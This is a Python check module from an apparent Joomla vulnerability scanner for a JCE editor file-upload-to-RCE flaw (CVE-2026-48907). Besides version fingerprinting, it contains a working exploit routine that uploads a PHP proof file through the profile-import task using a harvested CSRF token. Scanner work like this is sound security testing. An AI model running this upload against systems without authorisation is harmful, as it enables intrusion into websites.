from __future__ import annotations

import re

from ...core.evidence import generate_php_math_payload, verify_php_execution
from ...core.http import HttpSession, normalize_url, poll_paths
from ...core.models import Finding

CVECheckResult = Finding
from ...core.probes import CSRF_CANDIDATE_PATHS, extract_csrf_candidates_from_html, rand_str
from ...core.versions import parse_version_safe, version_lt

CVE_ID = "CVE-2026-48907"
NAME = "JCE Extension unauthenticated arbitrary file upload to RCE"
COMPONENT = "JCE Editor Extension"
PATCHED_VERSION = "2.9.99.5"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = f"{COMPONENT} < {PATCHED_VERSION}"


def _invalid_token_response(body: str) -> bool:
    lowered = body.lower()
    return "jinvalid_token" in lowered or "invalid token" in lowered or "token de segurança inválido" in lowered


def probe_jce(target_url: str, timeout: int = 12, proxy: str | None = None) -> dict:
    sess = HttpSession(normalize_url(target_url), timeout=timeout, proxy=proxy)
    result = {"found": False, "version": None}
    manifests = [
        "/plugins/editors/jce/jce.xml",
        "/administrator/components/com_jce/jce.xml",
    ]
    for path in manifests:
        resp = sess.get(path, timeout=6)
        body = resp.get("body", "") if resp else ""
        content_type = str(resp.get("content_type", "")).lower() if resp else ""
        valid_manifest = bool(
            resp
            and resp.get("status") == 200
            and "text/html" not in content_type
            and re.search(r"<(?:extension|install)\b", body, re.IGNORECASE)
            and re.search(r"<version>\s*[^<\s]+\s*</version>", body, re.IGNORECASE)
        )
        if valid_manifest and re.search(r"jce|com_jce|wf_editor|jcemediabox", body, re.IGNORECASE):
            match = re.search(r"<version>([^<]+)</version>", body, re.IGNORECASE)
            if match:
                return {"found": True, "version": match.group(1).strip()}
            result["found"] = True

    fingerprints = [
        "/plugins/system/jcemediabox/js/jcemediabox.js",
        "/plugins/system/jce/css/content.css",
        "/media/editors/jce/js/editor.min.js",
    ]
    for path in fingerprints:
        resp = sess.get(path, timeout=6)
        body = resp.get("body", "") if resp else ""
        content_type = str(resp.get("content_type", "")).lower() if resp else ""
        if (
            resp
            and resp.get("status") == 200
            and "text/html" not in content_type
            and re.search(r"jce|wf_editor|jcemediabox|tinymce", body, re.IGNORECASE)
        ):
            result["found"] = True
    return result


def passive_check(target_url: str, joomla_version: str | None, timeout: int = 12, proxy: str | None = None) -> Finding:
    jce = probe_jce(target_url, timeout=timeout, proxy=proxy)
    jce_version = jce.get("version")

    if not jce["found"]:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="NOT_DETECTED",
            confidence="HIGH",
            component=COMPONENT,
            component_version=None,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="JCE was not detected on the target via standard editor paths or manifests.",
            action="Component not detected via standard public routes; verify manually if installed in non-standard location.",
        )

    parsed_jce_version = parse_version_safe(jce_version)
    if jce_version and parsed_jce_version is None:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="INCONCLUSIVE",
            confidence="MEDIUM",
            component=COMPONENT,
            component_version=jce_version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"JCE was detected, but version value {jce_version!r} could not be parsed.",
            action=f"Manually verify JCE and upgrade to {PATCHED_VERSION} or later if needed.",
        )

    if parsed_jce_version is not None and version_lt(jce_version, PATCHED_VERSION):
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="LIKELY_VULNERABLE",
            confidence="HIGH",
            component=COMPONENT,
            component_version=jce_version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=(
                f"JCE {jce_version} is older than {PATCHED_VERSION}. "
                f"Joomla version from ProofCMS native scanner: {joomla_version or 'unknown'}."
            ),
            action=f"Upgrade JCE to {PATCHED_VERSION} or later.",
        )

    if parsed_jce_version is not None:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="PATCHED",
            confidence="HIGH",
            component=COMPONENT,
            component_version=jce_version,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"JCE {jce_version} is {PATCHED_VERSION} or later.",
            action=f"Keep JCE at {PATCHED_VERSION} or later.",
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="INCONCLUSIVE",
        confidence="MEDIUM",
        component=COMPONENT,
        component_version=None,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail="JCE was detected, but its version could not be determined.",
        action=f"Manually verify JCE and upgrade to {PATCHED_VERSION} or later if needed.",
    )


def _extract_csrf(sess: HttpSession) -> tuple[str | None, str | None, list[str]]:
    candidates, checked = _extract_csrf_candidates(sess)
    if candidates:
        token, source = candidates[0]
        return token, source, checked
    return None, None, checked


def _extract_csrf_candidates(sess: HttpSession) -> tuple[list[tuple[str, str]], list[str]]:
    checked = []
    candidates: list[tuple[str, str]] = []
    for path in CSRF_CANDIDATE_PATHS:
        resp = sess.get(path)
        checked.append(f"{path}:{resp.get('status') if resp else 0}")
        if not resp or resp.get("status") not in (200, 301, 302, 303):
            continue
        for token in extract_csrf_candidates_from_html(resp.get("body", "")):
            if not any(existing == token for existing, _ in candidates):
                candidates.append((token, path))
    return candidates, checked


def _handler_specific_response(body: str) -> bool:
    return bool(
        re.search(r'"success"\s*:\s*true', body, re.IGNORECASE)
        or re.search(r"\b\d+\s+profile\(s\)\s+imported\s+successfully", body, re.IGNORECASE)
        or re.search(r"jce|profile.{0,40}(import|upload)|import.{0,40}(success|complete)", body, re.IGNORECASE)
    )


def run_exploit(
    target_url: str,
    joomla_version: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    target_url = normalize_url(target_url)
    sess = HttpSession(target_url, timeout=timeout, proxy=proxy)
    passive = passive_check(target_url, joomla_version, timeout=timeout, proxy=proxy)

    if passive.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        passive.detail += " Exploit verification skipped because passive validation did not indicate a vulnerable JCE version."
        return passive

    token_candidates, checked_token_paths = _extract_csrf_candidates(sess)
    if not token_candidates:
        passive.detail += (
            " Exploit verification was requested but skipped because no Joomla CSRF token was found "
            "in homepage, common form pages, or administrator login. "
            f"Checked token paths: {', '.join(checked_token_paths)}."
        )
        return passive

    payload, expected = generate_php_math_payload()
    filename = f"jvh-{rand_str(6)}.xml.php"

    upload = None
    token_source = None
    rejected_sources = []
    for token, source in token_candidates:
        candidate_upload = sess.post(
            "/index.php?option=com_jce",
            fields={"task": "profiles.import", token: "1"},
            files={"profile_file": (filename, payload.encode("utf-8"), "application/xml")},
        )
        candidate_body = candidate_upload.get("body", "") if candidate_upload else ""
        if _invalid_token_response(candidate_body):
            rejected_sources.append(source)
            continue
        upload = candidate_upload
        token_source = source
        break
    passive.exploit_ran = True
    upload_body = upload.get("body", "") if upload else ""
    handler_specific = _handler_specific_response(upload_body)
    if (
        not upload
        or upload.get("status") != 200
        or upload.get("redirected")
        or not handler_specific
    ):
        externally_blocked = bool(upload and upload.get("redirected"))
        passive.status = "BLOCKED_EXTERNAL" if externally_blocked else "NOT_CONFIRMED"
        passive.confidence = "MEDIUM"
        passive.detail = (
            f"JCE {passive.component_version or 'version unknown'} is in the affected range, but the profile-import "
            + (
                "request was redirected before a JCE-specific handler response; external validation is blocked. "
                if externally_blocked
                else "request did not return a JCE-specific acceptance response. "
            )
            + "No write is claimed and no cleanup filename "
            f"is reported. CSRF token source: {token_source}; upload status: "
            f"{upload.get('status') if upload else 0}; redirected={upload.get('redirected') if upload else False}; "
            f"rejected token sources: {', '.join(rejected_sources) or 'none'}."
        )
        passive.evidence = {
            "component_present": True,
            "token_accepted": bool(upload) and not _invalid_token_response(upload_body),
            "handler_reached": handler_specific,
            "write_reported": False,
            "readback_verified": False,
        }
        return passive

    base_root = sess.base_url or target_url
    candidate_paths = [f"/tmp/{filename}", f"/{filename}"]
    resp, found_path, attempts = poll_paths(
        lambda p: sess.get(p, timeout=8),
        candidate_paths,
        deadline=3.0,
        initial_delay=0.1,
        accept_fn=lambda candidate: any(verify_php_execution(candidate.get("body", ""), expected)),
    )
    if resp and resp.get("status") == 200 and found_path:
        proof_url = f"{base_root}{found_path}"
        body = resp.get("body", "")
        is_exec, is_source = verify_php_execution(body, expected)
        if is_exec:
            return Finding(
                cve=CVE_ID,
                name=NAME,
                status="VULNERABLE",
                confidence="CONFIRMED",
                component=COMPONENT,
                component_version=passive.component_version,
                affected_rule=AFFECTED_RULE,
                exploit_available=HAS_EXPLOIT,
                exploit_ran=True,
                proof_url=proof_url,
                uploaded_filename=filename,
                detail=f"RCE confirmed with dynamic runtime math proof ({expected}) after {attempts} attempt(s). Uploaded proof file must be deleted.",
                action=f"Upgrade JCE to {PATCHED_VERSION} or later and delete {filename}.",
            )
        if is_source:
            passive.status = "VULNERABLE_UPLOAD_ONLY"
            passive.confidence = "HIGH"
            passive.proof_url = proof_url
            passive.uploaded_filename = filename
            passive.detail = (
                f"A proof file was uploaded (verified in {attempts} attempt(s)), but PHP execution was not confirmed "
                "(source served or execution blocked). Uploaded proof file must be deleted."
            )
            passive.action = f"Upgrade JCE to {PATCHED_VERSION} or later and delete {filename}."
            return passive

    passive.status = "NOT_CONFIRMED"
    passive.confidence = "MEDIUM"
    passive.detail += (
        f" The handler-specific response was observed, but no proof file was reachable after {attempts} attempt(s) "
        f"in checked locations (/tmp/{filename}, /{filename}). No write is claimed and no cleanup filename is "
        f"reported. CSRF token source: {token_source}."
    )
    passive.action = f"Upgrade JCE to {PATCHED_VERSION} or later."
    return passive


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict | None = None,
    **kwargs,
) -> Finding:
    if run_exploit_check:
        if exploit_mode != "safe":
            result = passive_check(target_url, joomla_version, timeout=timeout, proxy=proxy)
            result.detail += " This CVE module only supports safe exploit verification."
            return result
        return run_exploit(target_url, joomla_version=joomla_version, timeout=timeout, proxy=proxy)
    return passive_check(target_url, joomla_version, timeout=timeout, proxy=proxy)


def affects_joomla_version(joomla_version: str | None) -> bool:
    return "*" in AFFECTED_JOOMLA_VERSIONS


def metadata() -> dict:
    return {
        "cve": CVE_ID,
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": INTRUSIVE,
        "module_version": "1.4.0",
        "last_reviewed": "2026-03-20",
        "updated": "2026-03-20",
        "required_detectors": [],
        "references": [
            "https://www.joomlacontenteditor.net/news/item/jce-pro-2982-released",
            "Project baseline rule: JCE Editor < 2.9.99.5 (conservative cutoff preventing false PATCHED classifications)",
        ],
    }
